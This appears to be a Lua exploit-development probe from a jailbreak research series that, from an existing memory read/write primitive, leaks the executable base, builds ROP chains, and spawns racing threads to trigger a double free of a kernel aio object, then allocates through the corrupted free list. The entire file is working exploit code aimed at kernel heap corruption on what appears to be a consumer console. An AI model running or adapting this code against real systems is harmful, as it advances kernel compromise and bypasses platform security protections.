-- CRASH_CLASS: HIGH
-- PROBE 524a: one aio double-delete, then watch the allocator
--
-- Context: 523c put two thr_new children on the same 100 aio ids and 54 of
-- them returned status 0 from BOTH children (capture
-- results/phase17_new_vectors/523c_aio_delete_race_fixed_20261024_140951.txt).
-- A second delete of an id returns 0x80020003 when serialized (498a), so two
-- zero statuses mean both children ran the last-item path for the same object
-- and both freed the 0x30 context C. That is the TOC-TOU window the 14.20
-- note describes.
--
-- This probe isolates ONE such double free and then asks what the allocator
-- did with it. C is freed twice, so the next two 0x30 allocations can return
-- the same chunk. A single aio create makes exactly two 0x30 allocations
-- (T and C), so after a double free one create can end up with T == C, and
-- the object's own bookkeeping then points at itself.
--
-- Detection: the create/poll/delete after the double free either completes
-- normally (the allocator handed out two distinct chunks) or produces an
-- unusual status / kills the process (it handed out the same chunk twice).

print("=== PROBE 524a: ONE DOUBLE-DELETE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("[A] eboot=" .. fmt(eb))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42

local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local sc_create = mk(669)
local sc_poll   = mk(664)
local sc_delete = mk(662)
local sc_thr_new = mk(455)

local data = memory.alloc(0x100)
local out_id = memory.alloc(0x40)
local poll_out = memory.alloc(0x40)

local function create_polled()
    for i = 0, 0xFC, 4 do wd(N(data) + i, 0) end
    wq(N(out_id), uint64(0))
    local ok, rv = pcall(function()
        return sc_create(uint64(1), uint64(N(data)), uint64(1), uint64(1), uint64(N(out_id)))
    end)
    if not ok or N(rv) ~= 0 then return nil end
    local id = rd(N(out_id))
    if id == nil then return nil end
    local cell = memory.alloc(16)
    wd(N(cell), id)
    wd(N(poll_out), 0xCCCCCCCC)
    local pok = pcall(function() sc_poll(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
    return id, pok
end

-- child: sysarch preamble, one 662(ids,1,status), exit
local function build_delete_child(ids_addr, status_addr)
    local CHAIN_MAX = 0x1000
    local stk = memory.alloc(0x4000 + CHAIN_MAX)
    local sb = N(stk)
    local ss = 0x4000
    local rsp = sb + ss - 8

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(fs_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)

    emit(g_pop_rdi); emit(uint64(ids_addr))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(status_addr))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)

    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa + 0x00, g_bare_ret)
    wq(pa + 0x08, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_ptr = memory.alloc(8)
    wq(N(tid_ptr), uint64(0))
    wq(pa + 0x30, tid_ptr)
    return par
end

-- [B] hunt for one double delete
local ATTEMPTS = 25
print(string.format("[B] hunting one double delete (%d attempts)", ATTEMPTS))
local won = false
local win_id = nil
local win_status = nil
for attempt = 1, ATTEMPTS do
    local id, pok = create_polled()
    if id == nil or not pok then print("    create failed"); break end

    local ids_cell = memory.alloc(16)
    wd(N(ids_cell), id)
    local s1 = memory.alloc(16)
    local s2 = memory.alloc(16)
    wd(N(s1), 0xCCCCCCCC)
    wd(N(s2), 0xCCCCCCCC)

    local p1 = build_delete_child(N(ids_cell), N(s1))
    local p2 = build_delete_child(N(ids_cell), N(s2))
    pcall(function() sc_thr_new(p1, uint64(0x38)) end)
    pcall(function() sc_thr_new(p2, uint64(0x38)) end)

    local spins = 0
    while spins < 60000 do
        local a = rd(N(s1))
        local b = rd(N(s2))
        if a ~= -858993460 and b ~= -858993460 then break end
        spins = spins + 1
    end
    local v1 = rd(N(s1))
    local v2 = rd(N(s2))
    if not alive() then
        print(string.format("    attempt %d: DIED (id %d, %s / %s)", attempt, id,
            string.format("%08X", v1 or 0), string.format("%08X", v2 or 0)))
        return
    end
    if v1 == 0 and v2 == 0 then
        won = true
        win_id = id
        win_status = string.format("%08X %08X", v1, v2)
        print(string.format("    attempt %d: DOUBLE id=%d status=%s", attempt, id, win_status))
        break
    end
    if attempt % 5 == 0 then
        print(string.format("    attempt %d: %08X %08X", attempt, v1 or 0, v2 or 0))
    end
end

if not won then
    print("[B] no double delete observed")
    print("=== PROBE 524a INCOMPLETE ===")
    return
end

-- [C] allocate through the damaged free list
print("")
print("[C] create through the damaged free list")
for i = 1, 4 do
    local id, pok = create_polled()
    if id == nil then
        print(string.format("    create %d failed", i))
        break
    end
    print(string.format("    create %d: id=%d polled=%s alive=%s", i, id, tostring(pok), tostring(alive())))
    if not alive() then break end

    local cell = memory.alloc(16)
    wd(N(cell), id)
    local st = memory.alloc(16)
    wd(N(st), 0xCCCCCCCC)
    local dok = pcall(function() sc_delete(uint64(N(cell)), uint64(1), uint64(N(st))) end)
    print(string.format("        delete: ok=%s status=%08X alive=%s", tostring(dok), rd(N(st)) or 0, tostring(alive())))
    if not alive() then break end
end

-- [D] health
if alive() then
    local okc, clean = 0, 0
    for i = 1, 6 do
        local id, pok = create_polled()
        if id ~= nil then
            okc = okc + 1
            local cell = memory.alloc(16)
            wd(N(cell), id)
            local st = memory.alloc(16)
            wd(N(st), 0xCCCCCCCC)
            local dok = pcall(function() sc_delete(uint64(N(cell)), uint64(1), uint64(N(st))) end)
            if dok and rd(N(st)) == 0 then clean = clean + 1 end
        end
    end
    print(string.format("[D] health: created=%d clean-deletes=%d", okc, clean))
end

print("=== PROBE 524a COMPLETE ===")
